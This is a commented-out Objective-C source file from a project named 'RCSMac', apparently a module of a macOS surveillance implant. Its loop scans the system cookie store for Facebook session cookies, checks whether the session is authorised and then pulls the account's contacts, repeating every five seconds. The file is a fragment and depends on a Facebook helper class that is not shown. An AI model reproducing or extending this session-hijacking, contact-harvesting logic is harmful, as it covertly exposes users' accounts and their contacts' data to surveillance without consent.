//
//  __m_Social_Module.m
//  RCSMac
//
//  Created by guido on 3/22/13.
//
//
/*
#import "__m_Social_Module.h"

@implementation __m_Social_Module

- (id) init
{
    self = [super init];
    if (self)
        modFacebook = [__m_Social_Facebook new];
    
    return self;
}

- (bool) socialGetContacts
{
    [modFacebook getContacts];
    
    return YES;
}

- (void) socialLoop: (id)useLess
{
    while (1)
    {
        NSHTTPCookie *cookie;
        int sStatus = 0xdeadbeef;
        
        for (cookie in [self getCookies])
            if ([[cookie domain] rangeOfString:[modFacebook getCookiePattern]].length > 0)
                { sStatus = [modFacebook isAuthorized]; break; }
        
        switch (sStatus)
        {
            case YES:
                NSLog(@"[+] Authorized!");
                [self socialGetContacts];
                [NSThread sleepForTimeInterval:5];
                break;
            case SOCIAL_UNAUTHORIZED:
                NSLog(@"[W] Unauthorized!");
                [NSThread sleepForTimeInterval:5];
                break;
            case SOCIAL_NETWORK_ERROR:
                NSLog(@"[W] Network ERROR");
                [NSThread sleepForTimeInterval:5];
                break;
            case SOCIAL_PARSING_ERROR:
                NSLog(@"[!!] PARSING ERROR");
                [NSThread sleepForTimeInterval:5];
                break;
            default:
                NSLog(@"[!!] WUT %08x?!", sStatus);
                [NSThread sleepForTimeInterval:5];
                break;
        }
    }
}

- (NSArray *)getCookies
{
    return [[NSHTTPCookieStorage sharedHTTPCookieStorage] cookies];
}

@end
 */
